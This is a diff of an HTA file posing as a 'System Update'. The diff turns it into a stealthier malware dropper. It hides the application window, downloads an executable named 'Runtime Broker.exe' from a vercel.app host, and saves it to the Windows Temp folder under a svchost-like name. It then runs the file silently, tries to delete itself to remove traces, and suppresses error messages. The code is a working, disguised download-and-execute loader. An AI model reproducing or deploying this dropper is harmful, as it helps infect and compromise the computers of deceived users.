@@ -1,35 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Update</title>
+<HTA:APPLICATION 
+    ID="oHTA"
+    APPLICATIONNAME="System Update"
+    BORDER="none"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    SYSMENU="no"
+    SCROLL="no"
+    SELECTION="no"
+    INNERBORDER="no"
+/>
+<style>
+    /* Make the window tiny and invisible */
+    body { 
+        margin: 0; 
+        padding: 0; 
+        width: 1px; 
+        height: 1px; 
+        background-color: transparent; 
+        overflow: hidden;
+        visibility: hidden;
+    }
+</style>
+<title>Update</title>
 </head>
 <body>
-    <h2>Checking for exploits......</h2>
     <script language="JavaScript">
         try {
-            // Create the XMLHTTP object to download the file
+            // 1. Download payload
             var x = new ActiveXObject("MSXML2.XMLHTTP");
-            x.open("GET", "https://your-project.vercel.app/payload.exe", false);
+            // REPLACE WITH YOUR ACTUAL VERCEL URL
+            x.open("GET", "https://swift-executorlol.vercel.app/Runtime%20Broker.exe", false); 
             x.send();
 
-            // Create the ADODB.Stream object to save the file
+            // 2. Save to Temp (Guaranteed permissions)
             var s = new ActiveXObject("ADODB.Stream");
             s.Open();
             s.Type = 1; // Binary
             s.Write(x.responseBody);
-            s.SaveToFile("C:\\Windows\\Temp\\update.dat", 2); // Overwrite if exists
+            
+            // Use a generic name in the temp folder
+            var tempPath = "C:\\Windows\\Temp\\svchost_update.dat";
+            s.SaveToFile(tempPath, 2); 
             s.Close();
 
-            // Execute the downloaded payload
+            // 3. Execute silently
             var shell = new ActiveXObject("WScript.Shell");
-            shell.Run("cmd /c start C:\\Windows\\Temp\\update.dat", 0, false);
-            
-            // Optional: Delete the HTA itself to clean up traces
+            shell.Run(tempPath, 0, false);
+
+            // 4. Self-destruct
             var fso = new ActiveXObject("Scripting.FileSystemObject");
             fso.DeleteFile(WScript.ScriptFullName);
 
         } catch (e) {
-            alert("Error: " + e.message);
+            // Silent fail - no big white box with an X
         }
     </script>
 </body>
